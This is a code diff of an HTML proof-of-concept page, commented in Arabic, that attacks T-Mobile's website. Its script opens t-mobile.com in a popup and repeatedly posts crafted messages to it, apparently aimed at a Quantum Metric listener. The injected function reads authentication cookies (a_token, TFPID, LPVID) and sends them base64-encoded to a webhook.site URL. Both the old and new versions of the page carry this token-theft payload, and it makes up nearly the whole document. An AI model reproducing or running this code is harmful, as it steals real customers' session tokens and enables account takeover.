@@ -2,48 +2,69 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>PoC Elite</title>
+    <title>T-Mobile PoC Final</title>
 </head>
-<body style="background: #000; color: #e20074; text-align: center; font-family: monospace;">
-    <h2>Targeting: T-Mobile Authentication Tokens</h2>
-    <button onclick="start()" style="padding: 20px; cursor: pointer;">Start Extraction</button>
-    <p id="status">Status: Waiting...</p>
+<body style="background: #1a1a1a; color: #e20074; text-align: center; padding-top: 50px; font-family: Arial;">
+    <h1>T-Mobile Security Research</h1>
+    <div style="border: 2px solid #e20074; display: inline-block; padding: 20px;">
+        <button onclick="exploit()" style="padding: 15px 30px; background: #e20074; color: white; border: none; cursor: pointer; font-weight: bold;">تشغيل هجوم تسريب التوكن</button>
+        <p id="log" style="color: #00ff00; font-family: monospace;"></p>
+    </div>
 
 <script>
-    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+    
+    function log(m) { document.getElementById('log').innerText = "> " + m; }
 
-    function start() {
-        const vic = window.open('https://www.t-mobile.com/', '_blank');
-        document.getElementById('status').innerText = "Window Opened. Injecting...";
+    function exploit() {
+        log("يتم فتح T-Mobile...");
+        // فتح النافذة وتخزين المرجع
+        const vicWin = window.open('https://www.t-mobile.com/', 'victim');
 
-        // الدالة التي سيتم حقنها (مختصرة جداً)
-        const payloadStr = `() => {
-            const k = ['a_token', 'TFPID', 'LPVID'];
-            const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
-            fetch('${webhook}/?auth=' + btoa(d), {mode:'no-cors'});
-        }`;
+        if (!vicWin) {
+            alert("يرجى تفعيل الـ Pop-ups!");
+            return;
+        }
 
-        let count = 0;
-        const trigger = setInterval(() => {
-            count++;
-            // نرسل الـ Payload داخل كائن يحتوي على كلمات مفتاحية تثير اهتمام Quantum Metric
-            const msg = {
-                "type": "LPExternalWindowClosed",
-                "details": {
-                    "cvv": "999", 
-                    "toString": payloadStr 
-                }
-            };
-
-            // نرسل بصيغتين لضمان القبول
-            vic.postMessage(JSON.stringify(msg), "*");
-            vic.postMessage(msg, "*"); // في حال كان المتصفح يدعم الـ Clone هنا
-
-            if(count > 5) {
-                clearInterval(trigger);
-                document.getElementById('status').innerText = "Finished. Check Webhook.";
+        // تحضير الـ Payload بناءً على ما نجح معك في الكونسول
+        // لاحظ: نستخدم String هنا لتجنب DataCloneError
+        const payloadObject = {
+            "type": "qm-sync", 
+            "details": {
+                "account": "SCRUB_ME",
+                "cvv": "999",
+                "toString": `() => {
+                    const k = ['a_token', 'TFPID', 'LPVID'];
+                    const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
+                    navigator.sendBeacon('${webh}/?auth=' + btoa(d));
+                }`
             }
-        }, 4000);
+        };
+
+        log("انتظار تحميل السكربتات... (سيتم الإرسال بعد 10 ثوانٍ)");
+
+        // سنقوم بإرسال الرسالة كل 3 ثوانٍ لمدة دقيقة لضمان "صيد" الـ Listener
+        let attempts = 0;
+        const interval = setInterval(() => {
+            attempts++;
+            try {
+                // الطريقة 1: إرسال كـ Object (لو الـ Listener بيفك الـ Clone)
+                // ملحوظة: لإرسال دالةtoString، المتصفح قد يمنعها، لذا نرسل الـ Payload داخل String
+                vicWin.postMessage(payloadObject, "*");
+
+                // الطريقة 2: إرسال كـ JSON String (الأكثر فعالية لتخطي حواجز الـ Origin)
+                vicWin.postMessage(JSON.stringify(payloadObject), "*");
+
+                log("محاولة إرسال رقم: " + attempts);
+            } catch (e) {
+                log("خطأ في الإرسال: " + e.message);
+            }
+
+            if (attempts > 20) {
+                clearInterval(interval);
+                log("انتهت المحاولات. افحص الـ Webhook.");
+            }
+        }, 3000);
     }
 </script>
 </body>
